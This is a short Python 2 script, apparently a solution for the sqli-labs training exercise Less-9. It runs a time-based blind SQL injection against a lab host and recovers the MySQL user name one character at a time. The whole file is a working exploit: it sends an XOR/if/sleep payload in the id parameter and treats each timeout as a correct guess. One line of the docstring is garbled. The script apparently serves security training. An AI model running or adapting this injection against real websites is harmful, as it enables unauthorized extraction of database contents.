#!/usr/bin/env python
#encoding=utf-8

'''
GET -Blind-Time Based - Single Quotes
Œﬁªÿœ‘Œª
'''

import httplib, time, string, sys, random

headers = {}

# payloads
payloads = list(string.ascii_letters) + list(string.digits) + ['@', '_', '.']

# target
host = '10.0.103.130'

print 'Start to retrive MySQL User:'

user = ''

for i in range (1, 30):
    for payload in payloads:
        try:
            conn = httplib.HTTPConnection(host, timeout=3)
            conn.request(method='GET',
                            url = "/Less-9/?id=1'XOR(if(ascii(mid(user(), %s, 1))=%s, sleep(4), 0))OR'aa" % (i, ord(payload)),
                            headers = headers
            )
            start_time = time.time()
            conn.getresponse()
            conn.close()
        except:
            user += payload
            sys.stdout.write('\r[In Progress]' + user)
            sys.stdout.flush()
            print
            break

print '\n[Done] MySQL user is ' + user
